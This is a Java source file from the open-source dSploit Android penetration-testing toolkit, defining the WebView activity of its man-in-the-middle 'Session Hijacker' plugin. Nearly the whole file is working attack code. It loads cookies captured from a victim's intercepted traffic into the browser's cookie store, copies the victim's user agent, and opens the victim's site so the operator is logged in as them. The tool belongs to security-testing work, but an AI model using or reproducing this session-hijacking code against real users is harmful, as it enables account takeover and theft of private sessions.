/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package it.evilsocket.dsploit.plugins.mitm;

import android.app.*;
import android.os.*;
import android.view.*;
import android.webkit.*;
import it.evilsocket.dsploit.*;
import it.evilsocket.dsploit.core.*;
import it.evilsocket.dsploit.plugins.mitm.Hijacker.*;
import org.apache.http.impl.cookie.*;

import it.evilsocket.dsploit.core.System;

public class HijackerWebView extends Activity
{
	private static final String DEFAULT_USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4";

	private WebSettings mSettings = null;
	private WebView 	mWebView  = null;
	
	@Override  
    protected void onCreate( Bundle savedInstanceState ) {            
        super.onCreate(savedInstanceState);  
        requestWindowFeature(Window.FEATURE_INDETERMINATE_PROGRESS);
		requestWindowFeature(Window.FEATURE_PROGRESS);
        setTitle( System.getCurrentTarget() + " > MITM > Session Hijacker" );
        setContentView( R.layout.plugin_mitm_hijacker_webview );  
        getActionBar().setDisplayHomeAsUpEnabled(true);
        setProgressBarIndeterminateVisibility(false);
        
        mWebView  = ( WebView )findViewById( R.id.webView );               
        mSettings = mWebView.getSettings();  
        
        mSettings.setJavaScriptEnabled(true);  
        mSettings.setBuiltInZoomControls(true);  
		mSettings.setAppCacheEnabled(false);
        mSettings.setUserAgentString( DEFAULT_USER_AGENT );
        
        mWebView.setWebViewClient( new WebViewClient(){
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url){
              view.loadUrl(url);
              return true;
            }
        });
               
        mWebView.setWebChromeClient( new WebChromeClient() {
			public void onProgressChanged( WebView view, int progress ) {
				if( mWebView != null )
					getActionBar().setSubtitle( mWebView.getUrl() );
				
				setProgressBarIndeterminateVisibility(true);
				// Normalize our progress along the progress bar's scale
				int mmprogress = (Window.PROGRESS_END - Window.PROGRESS_START) / 100 * progress;
				setProgress(mmprogress);
				
				if( progress == 100 ) 
					setProgressBarIndeterminateVisibility(false);			
			}
		});
        
        CookieSyncManager.createInstance( this );              
    	CookieManager.getInstance().removeAllCookie();
    	
    	Session session = ( Session )System.getCustomData();
    	if( session != null )
    	{
    		String domain    = null,
    			   rawcookie = null;
    		
    		for( BasicClientCookie cookie : session.mCookies.values() )
    		{
    			domain 	  = cookie.getDomain();
    			rawcookie = cookie.getName() + "=" + cookie.getValue() + "; domain=" + domain + "; path=/" + ( session.mHTTPS ? ";secure" : "" );                        
    			        			
    			CookieManager.getInstance().setCookie( domain, rawcookie );
    		}
    		        		        		
    		CookieSyncManager.getInstance().sync();  
    		
    		if( session.mUserAgent != null && session.mUserAgent.isEmpty() == false )
    			mSettings.setUserAgentString( session.mUserAgent );
    		
    		mWebView.loadUrl( ( session.mHTTPS ? "https" : "http" ) + "://www." + domain );
    	}        	
    }  
	
	@Override
	protected void onResume() {
	    super.onResume();
	    
	    CookieSyncManager.getInstance().startSync();
	}
	
	@Override
	protected void onPause() {
		super.onPause();
		
		CookieSyncManager.getInstance().stopSync();
	}
	
	@Override
	public boolean onCreateOptionsMenu( Menu menu ) {
		MenuInflater inflater = getMenuInflater();
		inflater.inflate( R.menu.browser, menu );		
		return super.onCreateOptionsMenu(menu);
	}

	@Override
	public boolean onOptionsItemSelected( MenuItem item ) 
	{    
		switch( item.getItemId() ) 
		{        
			case android.R.id.home:            
	         
				mWebView = null;
				onBackPressed();
				
				return true;
	    	  
			case R.id.back :
				
				if( mWebView.canGoBack() )
					mWebView.goBack();
				
				return true;
				
			case R.id.forward :
				
				if( mWebView.canGoForward() )
					mWebView.goForward();
				
				return true;
				
			case R.id.reload :
				
				mWebView.reload();
				
			default:            
				return super.onOptionsItemSelected(item);    
	   }
	}
		
	@Override
	public void onBackPressed() {
		
		if( mWebView != null && mWebView.canGoBack() )
			mWebView.goBack();
		
		else
		{
			if( mWebView != null )
				mWebView.stopLoading();
			
			super.onBackPressed();
	    	overridePendingTransition(R.anim.slide_in_left, R.anim.slide_out_left);
		}
	}	
}
